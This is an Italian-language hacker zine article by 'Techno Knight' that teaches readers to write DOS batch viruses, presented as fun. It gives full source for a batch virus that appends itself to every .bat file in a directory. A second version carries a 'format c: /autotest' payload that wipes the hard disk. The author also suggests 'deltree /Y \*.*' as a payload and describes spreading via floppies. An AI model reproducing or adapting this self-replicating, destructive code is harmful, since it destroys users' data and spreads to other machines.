             ____         _______                                                           | _  |       |__   __|____   _    _                                             |   /   /---\   | |  / ___| | |  | |                                            |   \  |  _  |  | | | /     | |__| |                                            | |) | |  _  |  | | | \___  |  __  |                                            |___/  |_| |_|  |_|  \___/  |_|  |_|                                                                                                                                                       __                                                                  \\  // ||  | _\  || ||                                                           \\//  ||  |  /  || ||                                                            \/   ||  ||\\  || ||                                                                                                                                                                                                                                                                                                      di Techno Knight                                                                                                                         Uh leggendo qua e la' mi Š sembrato che ultimamente va molto di moda            scrivere virii in linguaggi non convenzionali, come il Visual Basic for         Application oppure virus batch. Beh per prima cosa mi sento in dovere di        dirvi che (almeno secondo il mio parere) scrivere macro virus o virus           batch pu• servire a divertirsi un p•, ma per scrivere un virus serio o          vi imparate l'asm o non entrerete mai nel meraviglioso mondo del virus          writing ;)                                                                      Cmq questa precisazione la dovevo fare per non sembrare lamer, ci tengo         a precisare che io principalmente i virus li scrivo in asm, solo che mi Š       sembrato divertente provare a fare qualcosa con il batch, quindi ho             scritto velocemente questa guida.                                                                                                                               Ecco un semplice virus batch :                                                                                                                                  @echo off                                                                       ctty nul                                                                        if %1==infetta goto infetta                                                     :cerca                                                                          for %%a in (*.bat) do call %0.bat infetta %%a                                   goto fine                                                                       :infetta                                                                        find ":cerca" %2 > nul                                                          if errorlevel 1 goto infettasi                                                  goto fine                                                                       :infettasi                                                                      type %0 >> %2                                                                   :fine                                                                           ctty con                                                                                                                                                        Comincia a cercare tutti gli altri .bat della directory, quando ne trova        uno richiama se stesso con il parametro "infetta" che dice al virus di non      fare la ricerca (perchŠ Š gi… stata fatta) ma di infettare il file gi…          trovato (passato come secondo parametro). Ad ogni file .bat presente nella      directory verranno aggiunte alla fine le righe del nostro virus, quindi         ogni bat si eseguir… normalmente ma alla fine eseguir… anche il virus.                                                                                          Un virus batch + letale si potrebbe fare chiamando un piccolo eseguibile.       Se ad esempio il file batch deve infettare un dischetto sul quale non Š         presente il file eseguibile lo copier… sul dischetto, e ovviamente se viene     eseguito da dischetto e deve infettare un hard disk sul quale non Š presente    il file eseguibile, allora lo copier… sull'hd, se invece si accorge che Š       gi… presente sul disco che deve infettare allora user… sempre quello.                                                                                           Per il payload possiamo usare le solite righe deltree /Y \*.*  oppure           format c: /autotest.                                                            Esempio :                                                                                                                                                                @echo off                                                                       ctty nul                                                                        if %1==infetta goto infetta                                                     :cerca                                                                          for %%a in (*.bat) do call %0.bat infetta %%a                                   goto fine                                                                       :infetta                                                                        find ":cerca" %2 > nul                                                          if errorlevel 1 goto infettasi                                                  goto fine                                                                       :infettasi                                                                      type %0 >> %2                                                                   :fine                                                                           if %2a==a goto verafine                                                         format c: /autotest                                                             :verafine                                                                       ctty con                                                                                                                                                        In questo caso se avremo la [s]fortuna di chiamare un batch infetto             passandogli almeno 2 parametri allora si attiver… il payload che                formatter… l'hard disk. Ovviamente le possibilit… sono tante e potete           usare molti altri eventi per attivare la vostra bomba.                                                                                                                                  Techno Knight (techno83@freemail.it)                                                                                                                                                                                    